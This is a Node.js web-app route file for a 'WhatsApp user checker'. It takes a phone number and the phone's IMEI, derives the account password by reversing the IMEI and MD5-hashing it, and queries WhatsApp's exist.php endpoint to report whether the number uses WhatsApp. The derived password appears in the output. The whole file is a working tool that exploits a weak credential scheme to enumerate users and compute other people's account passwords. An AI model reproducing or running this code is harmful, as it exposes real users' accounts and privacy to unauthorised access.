var https = require('https')
  , crypto = require('crypto')
  , xml2js = require('xml2js');

var title = 'WhatsApp user checker: ';

exports.nopost = function(req, res) {
  res.render('layout',{
    title: title+' WAITING',
    description: 'Insert data below to check if the user exists in WhatsApp servers.',
    defaultcc: 39
  });
};

exports.wauser = function(req, res) {
  //post data
  var cc = req.body.cc;
  var telephone = req.body.telephone;
  var imei = req.body.imei;
  //starting 'the trick'!
  var password = imei.split("").reverse().join("");
  password = crypto.createHash('md5').update(password).digest('hex');

  var options = {
    host: 'r.whatsapp.net',
    path: '/v1/exist.php?cc='+cc+'&in='+telephone+'&udid='+password
  };

  https.get(options, function(result) {
    console.log("Got response: " + result.statusCode);

    result.on('data', function(d) {
      var parser = new xml2js.Parser();

      parser.parseString(d, function(err, result) {
        if(result['exist']['response'][0]['$']['status']=='fail') //does not use WhatsApp
          res.render('layout',{
            title: title+' EXECUTED',
            useswa: 'The user +'+cc+''+telephone+' ('+imei+') [calculated pw: '+password+'] does *NOT* use WhatsApp',
            defaultcc: 39
          });
        else //WhatsApp!!
          res.render('layout',{
            title: title+' EXECUTED',
            useswa: 'The user +'+cc+''+telephone+' ('+imei+') [calculated pw: '+password+'] does use WhatsApp',
            defaultcc: 39
          });
      });
      
    });
  }).on('error', function(e) {
    console.log("Got error: " + e.message);
  });
};